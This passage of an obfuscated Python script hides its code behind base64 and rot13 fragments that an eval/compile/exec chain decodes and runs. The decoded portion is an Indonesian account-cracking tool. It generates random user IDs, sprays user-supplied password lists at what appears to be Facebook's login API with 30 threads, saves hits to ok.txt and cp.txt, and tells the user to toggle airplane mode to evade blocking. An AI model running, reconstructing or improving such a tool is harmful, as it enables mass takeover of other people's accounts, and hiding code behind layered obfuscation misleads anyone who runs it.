QVZFRCBJTiAtPiBjcC50eHQiJShZKSkNCgkJCQlwcmludCgiJXMgWyFdIEFLVElGS0FOIE1PREUgUEVTQVdBVCBTRUxBTUEgNSBERVRJSyEhXHgxYlswbVxuIiUoUikpDQoJCQkJZm9yIHVzZXIgaW4gc2VsZi5pZDoNCgkJCQkJY29lZy5zdWJtaXQoc2VsZi5hcGksIHVzZXIsIGxpc3RwYXNzLnNwbGl0KCIsIikpDQoJCQlleGl0KCJcblxuJXMgWyNdIENSQUNLIFNFTEVTQUkuLi4iJShHKSkNCgkJZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOmV4aXQoc3RyKGUpKQ0KCQkNCgkJDQoJZGVmIG9sZDRfNShzZWxmKToNCgkJeCA9IDExMTExMQ0KCQl4eCA9IDk5OTk5OQ0KCQkjaWR4ID0gaW5wdXQoIiVzIFsrXSBFTlRFUiBBIERJR0lUICgxLTkpOiAlcyIlKFksRykpDQoJCWlkeCA9IHJhbmRvbS5jaG9pY2UoWyIxIiwgIjIiLCAiMyIsICI0IiwgIjUiLCAiNiIsICI3IiwgIjgiLCAiOSJdKQ0KCQlsaW1pdCA9IGludChpbnB1dCgiXDAzM1swOzkybSBbK10gRU5URVIgTElNSVQgXDAzM1swOzkxbSg1MDAwMCBNQVgpOiBcMDMzWzA7OTJtIikpDQoJCWlmIChsaW1pdCk+NTAwMDA6DQoJCQlleGl0KCJcbiVzIFshXSBET04nVCBDUk9TUyBUSEUgTElNSVQgQlJPIDopIiUoUikpDQoJCXRyeToNCgkJCWZvciBuIGluIHJhbmdlKGxpbWl0KToNCgkJCQlfID0gcmFuZG9tLnJhbmRpbnQoeCx4eCkNCgkJCQlfXyA9IGlkeA0KCQkJCXNlbGYuaWQuYXBwZW5kKF9fK3N0cihfKSkNCgkJCXByaW50KCJcMDMzWzA7OTNtIFsrXSBUT1RBTCBJRCAtPiBcMDMzWzA7OTFtJXNcMDMzWzA7OTdtIiUobGVuKHNlbGYuaWQpKSkgDQoJCQl3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zMCkgYXMgY29lZzoNCgkJCQlwcmludCgiXG4lcyBbIV0gVVNFICVzLCAlcyhDT01NQSklcyBGT1IgU0VQQVJBVE9SICIlKFksRyxCLFkpKQ0KCQkJCXByaW50KCIlcyBFWEFNUExFIDogJXMxMjM0NTYsMTIzNDU2NywxMjM0NTY3ODkiJShZLEcpKSANCgkJCQlsaXN0cGFzcyA9IGlucHV0KCIlcyBbP10gRU5URVIgUEFTU1dPUkQgOiVzICIlKFksRykpDQoJCQkJaWYgbGVuKGxpc3RwYXNzKTw9NToNCgkJCQkJZXhpdCgiXG4lcyBbIV0gUEFTU1dPUkQgTUlOSU1VTSA2IENIQVJBQ1RFUlMiJShSKSkNCgkJCQlwcmludCgiJXMgWypdIENSQUNLIFdJVEggUEFTU1dPUkQgLT4gW1wwMzNbMDs5MW0lc1wwMzNbMDs5M21dIiUoWSxsaXN0cGFzcykpDQoJCQkJcHJpbnQoIlxuJXMgWytdIE9LIFJFU1VMVFMgU0FWRUQgSU4gLT4gb2sudHh0IiUoRykpDQoJCQkJcHJpbnQoIiVzIFsrXSBDUCBSRVNVTFRTIFNBVkVEIElOIC0+IGNwLnR4dCIlKFkpKQ0KCQkJCXByaW50KCIlcyBbIV0gQUtUSUZLQU4gTU9ERSBQRVNBV0FUIFNFTEFNQSA1IERFVElLISFceDFiWzBtXG4iJShSKSkNCgkJCQlmb3IgdXNlciBpbiBzZWxmLmlkOg0KCQkJCQljb2VnLnN1Ym1pdChzZWxmLmFwaSwgdXNlciwgbGlzdHBhc3Muc3BsaXQoIiwiKSkNCgkJCWV4aXQoIlxuXG4lcyBbI10gQ1JBQ0sgU0VMRVNBSS4uLiIlKEcpKQ0KCQlleGNlcHQgRXhjZXB0aW9uIGFzIGU6ZXhpdChzdHIoZSkpDQoJCQ0KCQkNCglkZWYgb2xkNF81KHNlbGYpOg0KCQl4ID0gMTExMTExDQoJCXh4ID0gOTk5OTk5DQoJCSNpZHggPSBpbnB1dCgiJXMgWytdIEVOVEVSIEEgRElHSVQgKDEtOSk6ICVzIiUoWSxHKSkNCgkJaWR4ID0gcmFuZG9tLmNob2ljZShbIjEiLCAiMiIsICIzIiwgIjQiLCAiNSIsICI2IiwgIjciLCAiOCIsICI5Il0pDQoJCWxpbWl0ID0gaW50KGlucHV0KCJcMDMzWzA7OTJtIFsrXSBFTlRFUiBMSU1JVCBcMDMzWzA7OTFtKDEwMDAwIE1BWCk6IFwwMzNbMDs5Mm0iKSkNCgkJaWYgKGxpbWl0KT4xMDAwMDoNCgkJCWV4aXQoIlxuJXMgWyFdIERPTidUIENST1NTIFRIRSBMSU1JVCBCUk8gOikiJShSKSkNCgkJdHJ5Og0KCQkJZm9yIG4gaW4gcmFuZ2UobGltaXQpOg0KCQkJCV8gPSByYW5kb20ucmFuZGludCh4LHh4KQ0KCQkJCV9fID0gaWR4DQoJCQkJc2VsZi5pZC5hcHBlbmQoX18rc3RyKF8pKQ0KCQkJcHJpbnQoIlwwMzNbMDs5M20gWytdIFRPVEFMIElEIC0+IFwwMzNbMDs5MW0lc1wwMzNbMDs5N20iJShsZW4oc2VsZi5pZCkpKSANCgkJCXdpdGggVGhyZWFkUG9vbEV4ZWN1dG9yKG1heF93b3JrZXJzPTMwKSBhcyBjb2VnOg0KCQkJCXByaW50KCJcbiVzIFshXSBVU0UgJXMsICVzKENPTU1BKSVzIEZPUiBTRVBBUkFUT1IgIiUoWSxHLEIsWSkpDQoJCQkJcHJpbnQoIiVzIEVYQU1QTEUgOiAlczEyMzQ1NiwxMjM0NTY3LDEyMzQ1Njc4OSIlKFksRykpIA0KCQkJCWxpc3RwYXNzID0gaW5wdXQoIiVzIFs/XSBFTlRFUiBQQVNTV09SRCA6JXMgIiUoWSxHKSkNCgkJCQlpZiBsZW4obGlzdHBh'
destiny = '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'
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))